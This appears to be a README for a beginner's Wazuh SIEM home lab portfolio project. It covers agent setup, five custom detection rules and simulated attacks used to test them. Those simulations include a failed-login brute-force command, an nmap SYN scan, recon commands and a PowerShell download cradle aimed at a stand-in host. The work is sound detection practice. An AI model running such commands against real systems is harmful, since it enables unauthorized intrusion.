# Wazuh SOC Home Lab

This is a beginner SOC analyst home lab project. I deployed a Wazuh SIEM system, connected a Windows 10 agent, wrote custom detection rules and simulated real attacks to test them.

---

## What I Built

- A Wazuh SIEM server running on Ubuntu 24 Desktop
- A Windows 10 virtual machine connected to Wazuh as an agent
- Custom detection rules for common attacks
- Attack simulations to verify the rules work

---

## Lab Setup

**Machines:**
- **Wazuh Server** — Ubuntu 24 Desktop (VirtualBox VM)
- **Agent** — Windows 10 (VirtualBox VM)

**Tools installed on Windows 10:**
- Wazuh Agent — ships logs to the Wazuh server
- Sysmon (SwiftOnSecurity config) — enriches Windows logs with process, file and network events

**How they connect:**
The Windows agent collects logs from the system and forwards them to the Wazuh server. The server analyses the logs against detection rules and fires alerts when something suspicious is found.

---

## Telemetry Collected

I configured the Windows agent to collect the following logs:

| Windows Security Logs | Logins, failed logins, privilege use |
| Sysmon | Process creation, file events, network connections |
| PowerShell Operational | PowerShell commands executed on the system |
| Windows Defender | Antivirus detections and updates |
| Windows System Logs | Service changes and system errors |

PowerShell Script Block Logging was also enabled so Wazuh can see the exact commands run in PowerShell.

---

## Custom Detection Rules

All rules are in `rules/local_rules.xml`. I wrote 5 custom rules:

| Rule ID | Name | Severity | MITRE ATT&CK |
|---------|------|----------|--------------|
| 100001 | Failed Windows logon | 5 | T1110 - Brute Force |
| 100002 | Brute force detected (5 failures in 2 min) | 10 | T1110 - Brute Force |
| 100003 | Possible port scan detected | 8 | T1046 - Network Service Discovery |
| 100005 | PowerShell download cradle detected | 12 | T1059.001 - PowerShell |
| 100006 | PowerShell reconnaissance command | 8 | T1059.001 - PowerShell |

**Rule severity scale:** 1-4 low, 5-7 medium, 8-11 high, 12+ critical

---

## Attack Simulations

### 1. Brute Force Login
Simulated multiple failed login attempts from the Windows machine using the `net use` command with a fake username and wrong password. Rule 100001 fired on the first failure and Rule 100002 fired after 5 failures within 2 minutes.

```powershell
net use \\127.0.0.1\admin$ /user:fakeuser wrongpassword
```

### 2. Port Scan
Ran an Nmap scan from the Ubuntu machine targeting the Windows agent to simulate a reconnaissance attack.

```bash
nmap -sS -p 1-1000 <windows-ip>
```

### 3. PowerShell Reconnaissance
Ran common recon commands inside PowerShell to simulate an attacker gathering information about the system.

```powershell
whoami
net user
systeminfo
```

### 4. PowerShell Download Cradle
Simulated a common malware technique where PowerShell is used to download a file from the internet.

```powershell
(New-Object Net.WebClient).DownloadString('http://test.com')
```

---

## Findings & Alerts

All simulated attacks generated alerts in the Wazuh dashboard. Screenshots of each alert are in the `screenshots/` folder.

| Attack | Alert Fired | Rule ID |
|--------|------------|---------|
| Failed logins | Yes | 100001 |
| Brute force | Yes | 100002 |
| PowerShell recon | Yes | 100006 |
| PowerShell download cradle | Yes | 100005 |

---

## False Positives & Tuning

During testing, Rule 92217 (Executable dropped in Windows root folder) fired on a legitimate Windows Defender signature update:

```
C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.445.713.0.exe
```

After investigating, I identified this as a false positive caused by Windows Update downloading a Defender antimalware patch.

This was a good lesson in alert investigation — not every alert means an actual attack.

---

## Future Improvements

- Add Suricata for network-level detection (port scans are better detected at the network layer)
- Integrate Active Directory logs
- Set up Wazuh Active Response to automatically block attacking IPs
- Run Atomic Red Team for full MITRE ATT&CK coverage

---

## Screenshots

All screenshots are in the `screenshots/` folder including:
- Wazuh dashboard with alerts firing
- Custom rules file
- Attack simulations running
- Sysmon and Event Viewer confirmation

---

Built as a portfolio project while learning SOC analysis. All attacks were simulated in an isolated virtual lab environment.
